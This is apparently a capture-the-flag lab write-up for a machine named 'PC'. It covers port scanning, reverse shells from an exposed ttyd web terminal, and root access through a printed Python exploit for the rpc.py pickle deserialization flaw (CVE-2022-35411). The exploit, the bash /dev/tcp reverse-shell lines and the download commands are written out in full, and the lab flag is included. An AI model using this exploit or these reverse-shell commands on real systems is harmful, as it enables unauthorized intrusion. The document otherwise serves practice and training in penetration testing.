# CTF Writeup: PC

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.153.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 07:15 EST
Nmap scan report for 192.168.153.210
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http    ttyd 1.7.3-a2312cb (libwebsockets 3.2.0)
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   29.48 ms 192.168.45.1
2   29.58 ms 192.168.45.254
3   29.62 ms 192.168.251.1
4   30.74 ms 192.168.153.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.10 seconds
```

There seems to be an web service running on port 8000.

Let's observe it.

It seems to be an webshell.

Let's get RCE.

## Initial Access

Started up my listener on port 22

```
nc -lvnp 22
```

Utilized the following command in order to get RCE.

```
user@pc:/tmp$ bash -i >& /dev/tcp/192.168.45.202/22 0>&1
```

Gained RCE as user "user".

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.165.210] 53372
user@pc:/tmp$
```

## Privilege Escalation

Performed shell hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated users on the target system.

```
user@pc:/tmp$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:,,,:/home/user:/bin/bash
```

Analyzing running services on the target system, we discover an service running on port 65432 internally.

```
user@pc:/$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1051/ttyd           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:65432         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

We discovered an script in /opt directory called "rpc.py" which is owned by user "root".

```
user@pc:/opt$ cat rpc.py
from typing import AsyncGenerator
from typing_extensions import TypedDict

import uvicorn
from rpcpy import RPC

app = RPC(mode="ASGI")


@app.register
async def none() -> None:
    return


@app.register
async def sayhi(name: str) -> str:
    return f"hi {name}"


@app.register
async def yield_data(max_num: int) -> AsyncGenerator[int, None]:
    for i in range(max_num):
        yield i


D = TypedDict("D", {"key": str, "other-key": str})


@app.register
async def query_dict(value: str) -> D:
    return {"key": value, "other-key": value}


if __name__ == "__main__":
    uvicorn.run(app, interface="asgi3", port=65432)
```

Let's check for CVE's for the script.

When googling "rpc.py exploit" we find CVE-2022-35411.

I modified the exploit slightly, since there were some "3D" chars in front of every variable & also I modified an reverse shell connection inside the source looks like this:

```
# Exploit Title: rpc.py 0.6.0 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 2022-07-12
# Exploit Author: Elias Hohl
# Vendor Homepage: https://github.com/abersheeran
# Software Link: https://github.com/abersheeran/rpc.py
# Version: v0.4.2 - v0.6.0
# Tested on: Debian 11, Ubuntu 20.04
# CVE : CVE-2022-35411

import requests
import pickle

# Unauthenticated RCE 0-day for https://github.com/abersheeran/rpc.py

HOST = "127.0.0.1:65432"

URL = f"http://{HOST}/sayhi"

HEADERS = {
    "serializer": "pickle"
}


def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload = pickle.dumps(PickleRce())

    print(payload)

    return payload


def exec_command(cmd):

    payload = generate_payload(cmd)

    requests.post(url=URL, data=payload, headers=HEADERS)


def main():
    exec_command('/bin/bash -c "bash -i >& /dev/tcp/192.168.45.202/8000 0>&1"')
    


if __name__ == "__main__":
    main()
```

Started up my listener on port 8000.

```
nc -lvnp 8000
```

Started up an python webserver on my local machine on port 80

```
python3 -m http.server 80
```

Downloaded the exploit.py onto the target machine in /tmp directory.	

```
wget http://192.168.45.202/exploit.py
```

Gave the exploit executable rights.

```
chmod +x exploit.py
```

Ran the initial exploit.

```
user@pc:/tmp$ python3 exploit.py 
b'\x80\x04\x95V\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c;/bin/bash -c "bash -i >& /dev/tcp/192.168.45.202/8000 0>&1"\x94\x85\x94R\x94.'
```

Gained RCE as user "root".

```
nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.165.210] 51574
bash: cannot set terminal process group (1050): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:/#
```

Retrieved proof.txt in /root directory.

```
bdd1468382ff942ec30758f00fc26eaf
```
